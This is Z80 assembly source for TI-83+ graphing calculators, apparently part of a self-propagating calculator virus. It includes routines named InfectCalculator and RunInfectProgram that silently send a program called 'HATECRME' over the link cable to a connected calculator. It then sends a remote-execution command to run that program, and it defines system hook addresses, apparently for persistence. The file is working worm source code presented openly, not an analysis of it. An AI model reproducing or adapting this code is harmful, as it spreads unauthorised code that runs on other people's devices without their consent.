LinkActivityHookPtr equ 9B78h
_EnableLinkActivityHook equ 4F84h
_DisableLinkAssistHook equ 4F87h 
LinkActivityHookFlag equ 33h
LinkActivityHookOverride equ 3

getKeyHookPtr equ 9B88h
_EnableGetKeyHook equ 4F7Bh
_DisableGetKeyHook equ 4F7Eh
getKeyHookActive equ 0
getKeyHookFlag equ 34h

;macros for routines running in UserMemTempCodeRun
tempcall MACRO addr
		call &addr -userMem-2+UserMemTempCodeRun
	MACEND
templd MACRO reg, val
		ld &reg, &val -userMem-2+UserMemTempCodeRun
	MACEND

ShadyRoutineCodeStart:

;routines to check the other calc to see if it's already infected
 include "checkinfect.asm"

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Send ShadyProgram:
InfectCalculator:
	templd hl, InfectHeaderSendParameters
	tempcall SilentSendVariableHeader
	templd hl, InfectProgramSendParameters
	tempcall SilentSendVariableData
	ret	

;send Program to execute shadyprogram:
SendExecProgram:
	templd hl, ExecHeaderSendParameters
	tempcall SilentSendVariableHeader
	templd hl, ExecProgramSendParameters
	tempcall SilentSendVariableData
	ret

RunInfectProgram:
	ld a, 23h
	b_call SendAByte
	ld a, 89h
	b_call SendAByte

	ld hl, RunInfectProgramDataBlockEnd-RunInfectProgramDataBlock
	ld a, l
	push hl
	b_call SendAByte
	pop hl
	ld a, h
	b_call SendAByte
	templd bc, RunInfectProgramDataBlock
	ld hl, 0000h
	push hl
RunInfectProgramDataLoop:
	ld a, (bc)
	ld d, 0
	ld e, a
	pop hl
	add hl, de
	push hl
	push bc
	b_call SendAByte
	pop bc
	inc bc
	ld h, b
	ld l, c
	templd de, RunInfectProgramDataBlockEnd
	b_call CpHLDE
	jr nz, RunInfectProgramDataLoop
	pop hl
	ld a, l
	push hl
   	b_call SendAByte
	pop hl
	ld a, h
	b_call SendAByte

	tempcall Rec4Bytes
	tempcall Rec4Bytes

	ret

InfectProgramHeader:
	db progobj
	db "HATECRME"
	db 00h
	db 00h ; version?
	db 00h ; type IO byte 2?
InfectProgramHeaderEnd:

ExecProgramHeader:
	db progobj
	.asciz "EXEC"
	db 00h ; version?
	db 00h ; type IO byte 2?
ExecProgramHeaderEnd:

ExecProgram:
	db 0BBh, tasm
	db tProg
	db "HATECRME"
ExecProgramEnd:

RunInfectProgramDataBlock:
	db 05h, 05h, 05h
	db "EXEC", 00h
RunInfectProgramDataBlockEnd:

SilentSendVariableHeader:
	;hl=block of data with addresses

	;block:
	;length of data header
	;address of header
	;end address of header
	;length of var

	push hl
	
	;Check to see if Calc is there and ready:
	ld a, 83h			;TI-83
	b_call SendAByte	
	ld a, 68h			;Chk Rdy
	b_call SendAByte
	tempcall SendTwoZeros	;0x00, 0x00

	;other CalC should respond with "Clear to send (CTS)" (56h)
	b_call RecAByteIO
	cp 73h 				;Is this a TI-83+ responding? If not, yikes!
	jr nz, hateralert	;Hater alert! Abort! Abort!
	b_call RecAByteIO
	cp 56h				;CTS?
	jr nz, hateralert	;other calc is not receiving anything. abort.
	b_call RecAByteIO ;0x00
	b_call RecAByteIO ;0x00
	jr nohater

hateralert:
	b_call RecAByteIO
	b_call RecAByteIO
	b_call RecAByteIO 
	pop hl
	ret

nohater:
	;tell the other calc it's gonna receive something fun
	ld a, 23h			;computer sending TI-83+ data
	b_call SendAByte	
	ld a, 0c9h			;Silent send variable	
	b_call SendAByte

	;send length of program header
	pop hl
	ld e, (hl) ;length of header
	inc hl
	ld d, (hl)
	;(+2 for length of program length thingey below)
	inc de
	inc de
	push hl
	ld a, e
	push de
	b_call SendAByte
	pop de
	ld a, d	
	b_call SendAByte


	;load into BC the address of the header
	pop hl
	inc hl ;move to next pointer (addr of header)
	ld c, (hl)
	inc hl
	ld b, (hl)
	push bc

	;load into DE the end address of the header
	inc hl ;move to next pointer (end addr of header)
	ld e, (hl)
	inc hl
	ld d, (hl)
	push de

	;send length of actual program:
	inc hl ;move to next pointer (length of variable)
	ld e, (hl)
	inc hl
	ld d, (hl)
	ld h, d
	ld l, e
	inc hl
	inc hl
	ld a, l
	push hl
	b_call SendAByte
	pop hl
	ld a, h
	push hl
	b_call SendAByte

	pop hl
	pop de
	pop bc

	push de

	;h and l need to be added to eachother
	ld d, 0
	ld e, l
	push de
	ld d, 0
	ld e, h
	ld hl, 0000h
	add hl, de
	pop de
	add hl, de
	push hl

	;variables
	;hl is the checksum, it already contains the length of shadyprogram
	;which must be added in, so it's cool. (on stack)
	;bc contains address of header
	;de contains end address of header (on stack)

SilentSendHeaderLoop:
	ld a, (bc)
	ld d, 0
	ld e, a

	pop hl
	add hl, de	;add checksum
	push hl

	push bc
	b_call SendAByte
	pop bc

	inc bc
	
	pop hl
	pop de
	push hl

	ld h, b
	ld l, c
	b_call CpHLDE ;hl=current address, de=end address
	pop hl
	push de
	push hl

	jr nz, SilentSendHeaderLoop

	;Send checksum (backwards)
	pop hl
	pop de ;screw that fool
	ld a, l
	push hl
    b_call SendAByte
	pop hl
	ld a, h
	b_call SendAByte

	b_call RecAByteIO
	cp 73h
	ret nz
	b_call RecAByteIO
	cp 56h					;data received ack
	ret nz
	b_call RecAByteIO
	b_call RecAByteIO

	b_call RecAByteIO
	cp 73h
	ret nz
	b_call RecAByteIO
	cp 09h					;clear to send
	ret nz
	b_call RecAByteIO
	b_call RecAByteIO

	ret

SilentSendVariableData:
	;hl=block of data with addresses

	;block:
	;length of var
	;address of var
	;end address of var
	push hl


	;ack the ack...
	ld a, 73h			;TI-83+ sending data
	b_call SendAByte
	ld a, 56h			;ack
	b_call SendAByte
	tempcall SendTwoZeros

	;send "data packet type"
	ld a, 73h			;TI-83+ sending data
	b_call SendAByte
	ld a, 15h			;data packet type
	b_call SendAByte

	;load into hl length of shadyprogram
	pop hl
	ld e, (hl)
	inc hl
	ld d, (hl)
	push hl
	ld h, d
	ld l, e
	inc hl
 	inc hl ;(+2 bytes for program header length)

	;send length
	ld a, l
	push hl
	b_call SendAByte
	pop hl
	ld a, h
	push hl
	b_call SendAByte

	pop hl
	dec hl
	dec hl
	;send length again... this is part of the actual program header, 
	;not the data packet header
	ld a, l
	push hl
	b_call SendAByte
	pop hl
	ld a, h
	b_call SendAByte

	;load into BC the address of the header
	pop hl
	inc hl
	ld c, (hl)
	inc hl ;move to next pointer (addr of var)
	ld b, (hl)

	;load into DE the end address of the header
	inc hl
	ld e, (hl)
	inc hl ;move to next pointer (end addr of var)
	ld d, (hl)

	;bc=address of var
	;de=end address of var
	push de

	;back up back to the start of the parameters and get the length again,
	;which is going to be stored in HL.
	dec hl
	dec hl
	dec hl
	dec hl
	dec hl

	b_call LdHLind

	;h and l need to be added to eachother
	ld d, 0
	ld e, l
	push de
	ld d, 0
	ld e, h
	ld hl, 0000h
	add hl, de
	pop de
	add hl, de
	push hl

SilentSendVarDataLoop:
	ld a, (bc)
	ld d, 0
	ld e, a

	pop hl
	add hl, de
	push hl

	push bc
	b_call SendAByte
	pop bc

	inc bc

	pop hl
	pop de
	push hl
	
	ld h, b
	ld l, c
	b_call CpHLDE
	pop hl
	push de
	push hl

	jr nz, SilentSendVarDataLoop

	;Send checksum (backwards)
	pop hl
	ld a, l
	push hl
   	b_call SendAByte
	pop hl
	ld a, h
	b_call SendAByte

	pop de ;get it out of the way, we don't care about it

	tempcall Rec4Bytes

	tempcall SendEOT

	ret


SendEOT:
	ld a, 73h
	b_call SendAByte
	ld a, 92h			;End of transmission
	b_call SendAByte
	tempcall SendTwoZeros
	ret


SendTwoZeros:
	xor a
	b_call SendAByte
	xor a
	b_call SendAByte
	ret

Rec4Bytes:
	;receive 4 bytes
	b_call RecAByteIO
	b_call RecAByteIO
	b_call RecAByteIO
	b_call RecAByteIO
	ret


	;length of data header
	;address of header
	;end address of header
	;length of var
InfectHeaderSendParameters:
	dw InfectProgramHeaderEnd-InfectProgramHeader
	dw InfectProgramHeader-userMem-2+UserMemTempCodeRun
	dw InfectProgramHeaderEnd-userMem-2+UserMemTempCodeRun
	dw ShadyCodeEnd-ShadyCodeStart
	;length of var
	;address of var
	;end address of var
InfectProgramSendParameters:
	dw ShadyCodeEnd-ShadyCodeStart
	dw ShadyCodeStart-userMem-2+UserMemTempCodeRun
	dw ShadyCodeEnd-userMem-2+UserMemTempCodeRun

ExecHeaderSendParameters:
	dw ExecProgramHeaderEnd-ExecProgramHeader
	dw ExecProgramHeader-userMem-2+UserMemTempCodeRun
	dw ExecProgramHeaderEnd-userMem-2+UserMemTempCodeRun
	dw ExecProgramEnd-ExecProgram
ExecProgramSendParameters:
	dw ExecProgramEnd-ExecProgram
	dw ExecProgram-userMem-2+UserMemTempCodeRun
	dw ExecProgramEnd-userMem-2+UserMemTempCodeRun

